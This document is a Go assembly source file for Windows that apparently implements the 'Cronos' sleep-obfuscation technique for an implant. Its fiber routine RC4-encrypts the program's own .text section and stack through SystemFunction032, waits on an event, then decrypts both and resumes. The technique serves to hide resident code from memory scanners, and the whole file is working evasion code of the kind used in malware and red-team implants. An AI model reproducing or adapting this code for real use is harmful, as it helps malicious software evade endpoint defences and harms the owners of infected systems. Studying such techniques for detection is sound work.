//go:build windows && amd64
#include "textflag.h"

// ---- Globals populated by Go before the fiber switch ----

// switchToFiberAddr holds the resolved address of
// kernel32!SwitchToFiber. Set via setSwitchToFiberAddr.
DATA ·switchToFiberAddr+0(SB)/8, $0
GLOBL ·switchToFiberAddr(SB), NOPTR, $8

// waitForSingleObjectAddr holds the resolved address of
// kernel32!WaitForSingleObject. Set via setWaitForSingleObjectAddr.
DATA ·waitForSingleObjectAddr+0(SB)/8, $0
GLOBL ·waitForSingleObjectAddr(SB), NOPTR, $8

// ---- Setters ----

//go:nosplit
TEXT ·setSwitchToFiberAddr(SB), NOSPLIT, $0-8
    MOVQ  addr+0(FP), AX
    MOVQ  AX, ·switchToFiberAddr(SB)
    RET

//go:nosplit
TEXT ·setWaitForSingleObjectAddr(SB), NOSPLIT, $0-8
    MOVQ  addr+0(FP), AX
    MOVQ  AX, ·waitForSingleObjectAddr(SB)
    RET

// ---- Fiber entry PC accessor ----
//
// Returns the raw PC of cronosFiberEntry so that CreateFiber can be
// given a native function pointer instead of a Go callback trampoline.
// The Go callback path would enter the runtime on the fiber thread,
// which the fiber's stack cannot support.
//
//go:nosplit
TEXT ·cronosFiberEntryPC(SB), NOSPLIT, $0-8
    LEAQ  ·cronosFiberEntry(SB), AX
    MOVQ  AX, ret+0(FP)
    RET

// ---- Switch stub ----
//
// Called from Go while the primary fiber's stack is still plaintext.
// Reads ctx->encryptFiber and calls SwitchToFiber. When the encrypt
// fiber eventually switches back to the primary fiber, execution
// resumes immediately after the CALL below.
//
// Go ABI: ctx is at FP+0.
TEXT ·cronosSwitchStub(SB), NOSPLIT, $0-8
    MOVQ  ctx+0(FP), R12            // R12 = ctx (callee-saved)
    MOVQ  ·switchToFiberAddr(SB), R10
    MOVQ  0x08(R12), CX             // ctx->encryptFiber
    CALL  R10
    RET

// ---- Fiber entry ----
//
// Called by Windows via CreateFiber. The Windows x64 ABI passes the
// fiber parameter (ctx) in RCX. This function MUST NOT call any Go
// code — the Go runtime does not know about this stack.
//
// The body:
//   1. encrypts .text
//   2. encrypts the primary fiber's stack region
//   3. waits on the event for durationMs
//   4. decrypts the primary fiber's stack region
//   5. decrypts .text
//   6. switches back to the primary fiber
//
// The function never returns; the final SwitchToFiber transfers
// control out of this fiber permanently.
TEXT ·cronosFiberEntry(SB), NOSPLIT, $0-0
    // Windows ABI: ctx is in RCX.
    MOVQ  CX, R12

    // Reserve frame space. 40 bytes = 32 shadow + 8 alignment
    // adjustment. On entry RSP is 8 mod 16; after SUBQ $40 RSP is
    // 0 mod 16, which is what the Windows ABI requires before a CALL.
    SUBQ  $40, SP

    // ---- Encrypt .text ----
    MOVQ  0x30(R12), CX             // ctx->textBase
    MOVQ  0x38(R12), DX             // ctx->textSize
    LEAQ  0x20(R12), R8             // &ctx->key
    MOVQ  0x50(R12), R9             // ctx->rc4Addr
    CALL  ·callSystemFunction032Native(SB)

    // ---- Encrypt the primary fiber's stack region ----
    // Skipped when the Go side reports a zero-size range, which is
    // the case because goroutine stack bounds are not exposed.
    MOVQ  0x48(R12), DX             // ctx->stackSize
    TESTQ DX, DX
    JZ    cronos_skip_enc_stack
    MOVQ  0x40(R12), CX             // ctx->stackBase
    LEAQ  0x20(R12), R8
    MOVQ  0x50(R12), R9
    CALL  ·callSystemFunction032Native(SB)
cronos_skip_enc_stack:

    // ---- WaitForSingleObject(event, durationMs) ----
    MOVQ  ·waitForSingleObjectAddr(SB), R10
    MOVQ  0x10(R12), CX             // ctx->eventHandle
    MOVL  0x18(R12), DX             // ctx->durationMs (32-bit)
    CALL  R10

    // ---- Decrypt the stack region (RC4 is symmetric) ----
    MOVQ  0x48(R12), DX             // ctx->stackSize
    TESTQ DX, DX
    JZ    cronos_skip_dec_stack
    MOVQ  0x40(R12), CX             // ctx->stackBase
    LEAQ  0x20(R12), R8
    MOVQ  0x50(R12), R9
    CALL  ·callSystemFunction032Native(SB)
cronos_skip_dec_stack:

    // ---- Decrypt .text ----
    MOVQ  0x30(R12), CX
    MOVQ  0x38(R12), DX
    LEAQ  0x20(R12), R8
    MOVQ  0x50(R12), R9
    CALL  ·callSystemFunction032Native(SB)

    // ---- Switch back to the primary fiber ----
    MOVQ  ·switchToFiberAddr(SB), R10
    MOVQ  0x00(R12), CX             // ctx->primaryFiber
    CALL  R10

    // Unreachable. If SwitchToFiber ever returns, something is
    // wrong with the fiber bookkeeping, and continuing on a stack
    // that the runtime does not own is worse than crashing here.
    INT   $3
    